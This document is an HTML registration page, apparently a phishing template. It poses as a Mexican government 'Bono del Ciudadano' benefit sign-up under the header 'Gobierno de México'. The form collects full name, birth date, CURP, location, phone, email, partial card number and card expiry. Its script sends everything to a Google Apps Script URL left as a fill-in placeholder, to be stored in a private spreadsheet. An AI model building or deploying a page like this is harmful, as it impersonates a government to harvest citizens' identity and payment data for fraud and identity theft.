<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Registro | Bono del Ciudadano</title>
  <style>
    :root { --v:#13322B; --g:#9F2241; --d:#D4C19C; --bg:#F2F2F2; }
    body { font-family: Arial, sans-serif; margin:0; background:var(--bg); color:#333; }
    header { background:var(--v); color:#fff; padding:14px 8%; border-bottom:4px solid var(--d); }
    .container { max-width:900px; margin:28px auto; background:#fff; padding:28px; border-radius:6px; box-shadow:0 4px 12px rgba(0,0,0,.12); }
    h2 { color:var(--g); border-bottom:2px solid var(--d); padding-bottom:8px; }
    .grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
    .form-group { margin-bottom:12px; }
    label { display:block; font-weight:700; margin-bottom:6px; color:var(--v); }
    input, select { width:100%; padding:10px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; }
    .full { grid-column:1 / -1; }
    button { width:100%; padding:13px; border:none; background:var(--g); color:#fff; border-radius:4px; font-weight:700; cursor:pointer; margin-top:10px; }
    .note { font-size:.9rem; color:#666; }
  </style>
</head>
<body>
  <header><strong>Gobierno de México | Registro de Bono</strong></header>
  <div class="container">
    <h2>Registro de Beneficiario</h2>
    <form id="formBono" class="grid">
      <div class="form-group full">
        <label for="nombre">Nombre completo</label>
        <input id="nombre" required />
      </div>
      <div class="form-group">
        <label for="fecha">Fecha de nacimiento</label>
        <input type="date" id="fecha" required />
      </div>
      <div class="form-group">
        <label for="curp">CURP</label>
        <input id="curp" maxlength="18" required style="text-transform:uppercase" />
      </div>
      <div class="form-group">
        <label for="estado">Estado</label>
        <select id="estado" required>
          <option value="">Seleccione...</option>
          <option>Aguascalientes</option><option>Baja California</option><option>Baja California Sur</option><option>Campeche</option><option>Chiapas</option><option>Chihuahua</option><option>Ciudad de México</option><option>Coahuila</option><option>Colima</option><option>Durango</option><option>Estado de México</option><option>Guanajuato</option><option>Guerrero</option><option>Hidalgo</option><option>Jalisco</option><option>Michoacán</option><option>Morelos</option><option>Nayarit</option><option>Nuevo León</option><option>Oaxaca</option><option>Puebla</option><option>Querétaro</option><option>Quintana Roo</option><option>San Luis Potosí</option><option>Sinaloa</option><option>Sonora</option><option>Tabasco</option><option>Tamaulipas</option><option>Tlaxcala</option><option>Veracruz</option><option>Yucatán</option><option>Zacatecas</option>
        </select>
      </div>
      <div class="form-group">
        <label for="ciudad">Ciudad</label>
        <input id="ciudad" required />
      </div>
      <div class="form-group">
        <label for="numeroCel">Número de teléfono</label>
        <input id="numeroCel" type="tel" pattern="[0-9]{10}" placeholder="10 dígitos" required />
      </div>
      <div class="form-group">
        <label for="codigoPost">Código postal</label>
        <input id="codigoPost" pattern="[0-9]{5}" required />
      </div>
      <div class="form-group">
        <label for="correo">Correo electrónico</label>
        <input id="correo" type="email" required />
      </div>
      <div class="form-group full">
        <label for="tarjeta">Tarjeta (solo últimos 4 dígitos por seguridad)</label>
        <input id="tarjeta" maxlength="4" pattern="[0-9]{4}" required />
      </div>
      <div class="form-group">
        <label for="fechaRegistro">Fecha de registro</label>
        <input id="fechaRegistro" type="date" required />
      </div>
      <div class="form-group">
        <label for="exp">Expiración (MM/AA)</label>
        <input id="exp" placeholder="02/45" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" required />
      </div>
      <div class="full note">Se enviará al Apps Script para guardarse en la hoja "Bono".</div>
      <div class="full"><button type="submit">Guardar registro</button></div>
    </form>
  </div>

  <script>
    const API_URL = 'PEGA_AQUI_TU_URL_WEBAPP';
    document.getElementById('fechaRegistro').valueAsDate = new Date();

    document.getElementById('formBono').addEventListener('submit', async (e) => {
      e.preventDefault();
      const data = {
        nombre: nombre.value.trim(),
        fecha: fecha.value,
        estado: estado.value,
        ciudad: ciudad.value.trim(),
        curp: curp.value.trim().toUpperCase(),
        numeroCel: numeroCel.value.trim(),
        tarjeta: tarjeta.value.trim(),
        fechaRegistro: fechaRegistro.value,
        exp: exp.value.trim(),
        codigoPost: codigoPost.value.trim(),
        correo: correo.value.trim().toLowerCase()
      };

      try {
        const res = await fetch(API_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        const json = await res.json();
        if (!json.ok) throw new Error(json.error || 'Error al guardar');
        alert('Registro guardado correctamente.');
        e.target.reset();
        document.getElementById('fechaRegistro').valueAsDate = new Date();
      } catch (err) {
        alert('No se pudo guardar: ' + err.message);
      }
    });
  </script>
</body>
</html>
